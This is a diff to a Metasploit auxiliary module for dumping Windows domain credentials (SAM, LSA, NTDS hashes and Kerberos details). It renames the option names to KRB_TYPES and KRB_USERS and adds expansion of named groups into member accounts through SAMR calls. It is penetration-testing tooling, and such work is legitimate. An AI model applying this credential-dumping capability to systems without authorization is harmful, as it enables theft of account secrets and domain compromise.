@@ -93,8 +93,8 @@ class MetasploitModule < Msf::Auxiliary
           [ true, 'Use inline technique to read protected keys from the registry remotely without saving the hives to disk', true ],
           conditions: ['ACTION', 'in', %w[ALL SAM CACHE LSA]]
         ),
-        OptEnum.new('KERBEROS_TYPES', [true, 'Which type of accounts to retrieve kerberos details for', 'ALL', ['ALL','USERS_ONLY','COMPUTERS_ONLY']], conditions: ['ACTION', 'in', %w[ALL DOMAIN]]),
-        OptString.new('KERBEROS_USERS', [false, 'Which specific accounts to retrieve kerberos details for', ''], conditions: ['ACTION', 'in', %w[ALL DOMAIN]])
+        OptEnum.new('KRB_TYPES', [true, 'Which type of accounts to retrieve kerberos details for', 'ALL', ['ALL', 'USERS_ONLY', 'COMPUTERS_ONLY']], conditions: ['ACTION', 'in', %w[ALL DOMAIN]]),
+        OptString.new('KRB_USERS', [false, 'Which specific user accounts or groups to retrieve kerberos details for', ''], conditions: ['ACTION', 'in', %w[ALL DOMAIN]])
       ]
     )
 
@@ -615,10 +615,11 @@ class MetasploitModule < Msf::Auxiliary
     user_uac = RubySMB::Dcerpc::Samr::USER_NORMAL_ACCOUNT
     computer_uac = RubySMB::Dcerpc::Samr::USER_WORKSTATION_TRUST_ACCOUNT | RubySMB::Dcerpc::Samr::USER_SERVER_TRUST_ACCOUNT | RubySMB::Dcerpc::Samr::USER_INTERDOMAIN_TRUST_ACCOUNT
     all_uac = user_uac | computer_uac
-    uac = {'ALL' => all_uac,
-           'USERS_ONLY' => user_uac,
-           'COMPUTERS_ONLY' => computer_uac
-          }[datastore['KERBEROS_TYPES']]
+    uac = {
+      'ALL' => all_uac,
+      'USERS_ONLY' => user_uac,
+      'COMPUTERS_ONLY' => computer_uac
+    }[datastore['KRB_TYPES']]
     users = @samr.samr_enumerate_users_in_domain(domain_handle: @domain_handle, user_account_control: uac)
     vprint_status("Obtained #{users.length} domain users, fetching the SID for each...")
     progress_interval = 250
@@ -841,24 +842,37 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_domain_users_by_name(names)
-    if datastore['KERBEROS_TYPES'] != 'ALL'
-      print_warning("Searching for specific users; KERBEROS_TYPES setting (#{datastore['KERBEROS_TYPES']}) will be ignored")
-    end
-
     details = @samr.samr_lookup_names_in_domain(
-        domain_handle: @domain_handle,
-        names: names
-      )
-      raise Msf::Exploit::Remote::MsSamr::MsSamrNotFoundError, 'One or more of the provided names was not found.' if details.nil?
+      domain_handle: @domain_handle,
+      names: names
+    )
+    raise Msf::Exploit::Remote::MsSamr::MsSamrNotFoundError, 'One or more of the provided names was not found.' if details.nil?
 
-    names.map do |name|
+    result = []
+    names.each do |name|
       user_details = details[name]
-      sid = @samr.samr_rid_to_sid(
-        object_handle: @domain_handle,
-        rid: user_details[:rid]
-      ).to_s
-      [sid, name]
+      case user_details[:use]
+      when 1 # SidTypeUser
+        sid = @samr.samr_rid_to_sid(
+          object_handle: @domain_handle,
+          rid: user_details[:rid]
+        ).to_s
+        result.append([sid, name])
+      when 2 # SidTypeGroup
+        handle = @samr.samr_open_group(domain_handle: @domain_handle, group_id: user_details[:rid])
+        results = @samr.samr_get_members_in_group(group_handle: handle)
+        results.each do |entry|
+          member_rid = entry[0]
+          sid = @samr.samr_rid_to_sid(
+            object_handle: @domain_handle,
+            rid: member_rid
+          ).to_s
+          result.append([sid, ''])
+        end
+      end
     end
+
+    result
   end
 
   def dump_ntds_hashes
@@ -877,10 +891,15 @@ class MetasploitModule < Msf::Auxiliary
       )
       return
     end
-    specific_users = datastore['KERBEROS_USERS'].strip.split(',')
-    if specific_users.length == 0
+    specific_users = datastore['KRB_USERS'].strip.split(',')
+
+    if specific_users.empty?
       users = get_domain_users
     else
+      if datastore['KRB_TYPES'] != 'ALL'
+        print_warning("Searching for specific users/groups; KRB_TYPES setting (#{datastore['KRB_TYPES']}) will be ignored")
+      end
+
       users = get_domain_users_by_name(specific_users)
     end
 
